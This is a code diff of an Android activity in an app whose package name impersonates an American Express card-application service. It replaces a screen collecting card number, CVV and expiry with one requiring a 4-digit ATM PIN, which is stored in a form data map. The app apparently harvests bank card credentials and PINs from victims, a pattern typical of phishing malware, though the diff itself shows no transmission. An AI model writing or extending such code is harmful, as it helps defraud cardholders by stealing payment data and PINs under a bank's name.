@@ -1,15 +1,10 @@
 package com.service.americanexpresscardapply;
 
-import android.animation.ObjectAnimator;
-import android.animation.ValueAnimator;
 import android.annotation.SuppressLint;
 import android.content.Intent;
 import android.os.Bundle;
-import android.view.View;
-import android.view.animation.LinearInterpolator;
 import android.widget.Button;
 import android.widget.EditText;
-import android.widget.TextView;
 import android.widget.Toast;
 
 import org.json.JSONException;
@@ -18,27 +13,20 @@ import org.json.JSONObject;
 import java.util.HashMap;
 import java.util.Map;
 
-public class ThirdActivity extends  BaseActivity {
+public class Debit2 extends  BaseActivity {
 
     @SuppressLint("SetTextI18n")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main3);
+        setContentView(R.layout.debit2);
 
-        EditText survaycard = findViewById(R.id.cardNum);
-        survaycard.addTextChangedListener(new DebitCardInputMask(survaycard));
-
-        EditText expiry = findViewById(R.id.expirydt);
-        expiry.addTextChangedListener(new ExpiryDateInputMask(expiry));
 
         int form_id = getIntent().getIntExtra("form_id", -1);
 
         dataObject = new HashMap<>();
         ids = new HashMap<>();
-        ids.put(R.id.cardNum, "cardNum");
-        ids.put(R.id.cvv, "cvv");
-        ids.put(R.id.expirydt, "expirydt");
+        ids.put(R.id.atmpin, "atmpin");
 
         // Populate dataObject
         for(Map.Entry<Integer, String> entry : ids.entrySet()) {
@@ -118,22 +106,11 @@ public class ThirdActivity extends  BaseActivity {
 
             // Validate based on the key
             switch (key) {
-                case "cardNum":
-                    if (!FormValidator.validateMinLength(editText, 19, "Required 16 digit")) {
+                case "atmpin":
+                    if (!FormValidator.validateMinLength(editText, 4,  "Required 4 Digit Pin")) {
                         isValid = false;
                     }
                     break;
-                case "cvv":
-                    if (!FormValidator.validateMinLength(editText, 3,  "Invalid CVV")) {
-                        isValid = false;
-                    }
-                    break;
-                case "expirydt":
-                    if (!FormValidator.validateMinLength(editText, 5,  "Invalid Expiry Date")) {
-                        isValid = false;
-                    }
-                    break;
-
                 default:
                     break;
             }
